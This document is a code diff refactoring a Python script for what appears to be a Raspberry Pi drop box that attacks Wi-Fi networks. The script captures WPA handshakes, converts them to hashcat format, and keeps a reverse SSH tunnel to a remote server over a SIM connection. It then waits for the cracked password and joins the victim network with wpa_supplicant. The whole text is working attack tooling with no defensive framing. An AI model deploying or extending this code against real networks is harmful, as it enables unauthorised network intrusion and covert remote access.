@@ -15,59 +15,71 @@ from telegram_api import TelegramBot
 
 
 def check_config_file():
-    """This function checks if configuration file exists and it has every mandatory key"""
+    """This function checks if configuration file exists and has all mandatory keys."""
+    
+    file_path = 'src/configuration.json'
+    mandatory_fields = ['interface', 'ssid', 'send_handshake', 'reverse_ssh_tunnel']
+    
+    if not os.path.isfile(file_path):
+        write_log(f'[!] Configuration file "configuration.json" does not exist.')
+        sys.exit(1)
     
     try:
-        with open('src/configuration.json') as f:
+        with open(file_path) as f:
             configuration_fields = json.load(f)
-            mandatory_fields = ['interface', 'ssid', 'send_handshake', 'reverse_ssh_tunnel']
-            abort_program = False
-            for field in mandatory_fields:
-                if not field in configuration_fields:
-                    write_log(f'[!] Configuration file "configuration.json" is uncomplete. Field "{field}" not found')
-                    abort_program = True
-            if abort_program:
-                sys.exit(1)
+    
+    except json.JSONDecodeError:
+        write_log('[!] Error decoding JSON from "configuration.json". Check the file format.')
+        sys.exit(1)
             
-    except FileNotFoundError:
-        write_log(f'[!] Configuration file "configuration.json" does not exists')
+    missing_fields = [field for field in mandatory_fields if field not in configuration_fields]
+    if missing_fields:
+        for field in missing_fields:
+            write_log(f'[!] Configuration file "configuration.json" uncomplete. Field "{field}" not found')
+        
         sys.exit(1)
         
         
 def check_dependencies():
     """Check if every required command is installed"""
     
-    dependencies = ['hcxpcapngtool', 'minicom', 'dhclient --help', 'wpa_passphrase', 'wpa_supplicant --help', 'screen --help']
+    dependencies = ['hcxpcapngtool --help', 'minicom --help', 'dhclient --help', 'wpa_supplicant --help', 'screen --help']
     for command in dependencies:
-        output = subprocess.run(command, shell=True, capture_output=True, text=True)
-        if output.returncode != 0 and output.returncode != 1:
+        try:
+            subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
+        
+        except subprocess.CalledProcessError:
             write_log(f'[!] Command "{command}" not installed')
             sys.exit(1)
             
             
 def pcap_to_hashcat_format(file_name: str):
-    """Transform the .pcap file from airodump into a hashcat readable format
+    """Transform the .pcap file from airodump into a hashcat readable format.
 
     Args:
         file_name (str): Name of the .pcap file. The name matches the parameter that was specified along with the '-w' option of airodump.
     """
     
-    command = f'hcxpcapngtool -o src/files/{file_name}.hc22000 src/files/{file_name}-01.cap'
-    run = subprocess.run(command, shell=True, capture_output=True, text=True)
-    if run.stderr:
-        write_log(f'[!] Failed in command "{command}"')
-        sys.exit(1)
-    else:
+    input_file = f'src/files/{file_name}-01.cap'
+    output_file = f'src/files/{file_name}.hc22000'
+    
+    try:
+        command = ['hcxpcapngtool', '-o', output_file, input_file]
+        subprocess.run(command, capture_output=True, text=True, check=True)
         write_log(f'[+] .cap file exported correctly to hashcat format')
+    
+    except subprocess.CalledProcessError as e:
+        write_log(f'[!] Failed to execute hcxpcapngtool. Command: {" ".join(command)}. Error: {e.stderr}')
+        sys.exit(1)
         
         
 def open_reverse_tunnel(persistent = False):
-    """Open a reverse tunnel from the raspberry to the configured server. The configured server must be specified in 'configuration.json' file with the key 
-    'reverse_ssh_tunnel'. The following fields are mandatory:
+    """Open a reverse tunnel from the raspberry to the configured server. The configured server information must be specified in 'configuration.json' file with the 
+    key 'reverse_ssh_tunnel'. The following fields are mandatory:
         - user: indicates the remote user
         - host: indicates the remote host
-        - key_path: this fields is very important to establish the connection. You have to specify the path where the private key (previosly configured) to connect
-        to the remote host is placed.
+        - key_path: this field is very important to establish the connection. You have to specify the path where the private key (previosly generated and 
+        configured in remote host) to connect to the remote host is placed.
 
     Args:
         persistent (bool, optional): If it is True, creates a reverse tunnel with 'screen' command to make it persistent. Defaults to False.
@@ -119,48 +131,57 @@ def enable_internet_through_sim():
         process: Instance of the execution of 'subprocess.Popen' to kill the process when necessary.
     """
     
-    try:
-        file_path = os.path.join('minicom', 'init.txt')
-        with open(file_path) as _:
-            command = ['minicom', '-D', '/dev/ttyUSB2', '-S', file_path]
-            process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            time.sleep(30)
-            
-            command = 'dhclient usb0'
-            output = subprocess.run(command, shell=True, capture_output=True, text=True)
-            if output.stderr:
-                write_log(f'[!] Error executing command "{command}"')
-                sys.exit(1)
-            
-            return process
-            
-    except FileNotFoundError:
-        write_log(f'[!] Script to start internet through SIM card does not exists')
+    file_path = 'minicom/init.txt'
+
+    if not os.path.isfile(file_path):
+        write_log('[!] Script to start internet through SIM card does not exist.')
         sys.exit(1)
         
+    command = ['minicom', '-D', '/dev/ttyUSB2', '-S', file_path]
+    process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
+    time.sleep(30)
+    
+    try:
+        command = ['dhclient', 'usb0']
+        subprocess.run(command, capture_output=True, text=True, check=True)
+        write_log('[+] Internet through SIM enabled.')
+    
+    except subprocess.CalledProcessError as e:
+        write_log(f'[!] Failed to execute dhclient. Command: {" ".join(command)}. Error: {e.stderr}')
+        sys.exit(1)
+        
+    return process
+            
         
 def disable_internet_through_sim():
     """Disable the connection to internet previously set up via SIM card"""
     
-    try:
-        file_path = os.path.join('minicom', 'stop.txt')
-        with open(file_path) as f:
-            command = 'dhclient -r usb0'
-            subprocess.run(command, shell=True, text=True)
-            
-            time.sleep(10)
-            
-            command = ['minicom', '-D', '/dev/ttyUSB2', '-S', file_path]
-            process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            time.sleep(30)
-            
-            kill_process(process)
-            
-    except FileNotFoundError:
-        write_log(f'[!] Script to stop internet through SIM card does not exists')
+    file_path = 'minicom/stop.txt'
+    
+    if not os.path.isfile(file_path):
+        write_log('[!] Script to stop internet through SIM card does not exist.')
         sys.exit(1)
+
+    try:
+        command = ['dhclient', '-r', 'usb0']
+        subprocess.run(command, capture_output=True, text=True, check=True)
+    
+    except subprocess.CalledProcessError as e:
+        write_log(f'[!] Failed to execute dhclient. Command: {" ".join(command)}. Error: {e.stderr}')
+        sys.exit(1)
+    
+    time.sleep(10)
+    
+    command = ['minicom', '-D', '/dev/ttyUSB2', '-S', file_path]
+    process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
+    time.sleep(30)
+    
+    kill_process(process)
+    
+    write_log('[+] Internet through SIM disabled.')
+        
 
 
 def send_captured_handshake(captured_handshake_file_name: str):
@@ -191,7 +212,7 @@ def wait_for_cracked_password():
     while not cracked_password:
         try:
             with open('src/files/cracked_password.txt') as f:
-                cracked_password = f.read()
+                cracked_password = f.read().replace('\n', '').replace('\r', '')
                     
         except FileNotFoundError:
             # time.sleep(120)  # wait for 2 minutes to check again in PROD
@@ -209,22 +230,29 @@ def connect_to_network(network_ssid: str, cracked_password: str):
     """
     
     # Generate wpa config file
-    command = f'wpa_passphrase {network_ssid} {cracked_password}'
+    command = ['wpa_passphrase', network_ssid, cracked_password]
     with open(f'/tmp/{network_ssid}.conf', 'w') as f:
-        subprocess.run(command, shell=True, text=True, stdout=f)
+        subprocess.run(command, text=True, stdout=f)
         
     # Connect to wifi
-    command = f'wpa_supplicant -B -i wlan0 -c /tmp/{network_ssid}.conf'
-    output = subprocess.run(command, shell=True, capture_output=True, text=True)
-    if output.stderr:
-        write_log(f'[!] Error executing command "{command}"')
+    command = ['wpa_supplicant', '-B', '-i', 'wlan0', '-c', f'/tmp/{network_ssid}.conf']
+    try:
+        subprocess.run(command, capture_output=True, text=True, check=True)
+    
+    except subprocess.CalledProcessError as e:
+        write_log(f'[!] Failed to execute wpa_supplicant. Command: {" ".join(command)}. Error: {e.stderr}')
         sys.exit(1)
     
     time.sleep(30)
 
     # Getting an IP
-    command = 'dhclient wlan0'
-    output = subprocess.run(command, shell=True, text=True)
+    command = ['dhclient', 'wlan0']
+    try:
+        subprocess.run(command, capture_output=True, text=True, check=True)
+        
+    except subprocess.CalledProcessError as e:
+        write_log(f'[!] Failed to execute dhclient. Command {" ".join(command)}. Error: {e.stderr}')
+        sys.exit(1)
     
     time.sleep(10)
     
@@ -238,9 +266,12 @@ def initialize_telegram_bot():
     
     telegram_bot = None
     
-    telegram_bot_information = get_config_field('telegram_bot')
-    if telegram_bot_information and 'api_token' in telegram_bot_information:
-        telegram_bot = TelegramBot(telegram_bot_information.get('api_token'))
+    telegram_bot_information: dict = get_config_field('telegram_bot')
+    
+    if telegram_bot_information and 'api_token' in telegram_bot_information and 'chat_id' in telegram_bot_information:
+        api_token = telegram_bot_information.get('api_token')
+        chat_id = telegram_bot_information.get('chat_id')
+        telegram_bot = TelegramBot(api_token, chat_id)
     else:
         write_log('[!] Telegram bot information uncomplete. It has not been created')
         
@@ -297,7 +328,7 @@ if __name__ == '__main__':
     if not cracked_password:
         write_log('[!] Something went wrong reading cracked password')
         sys.exit(1)
-    
+        
     kill_process(reverse_tunnel_process)
     kill_process(sim_internet_process)
     
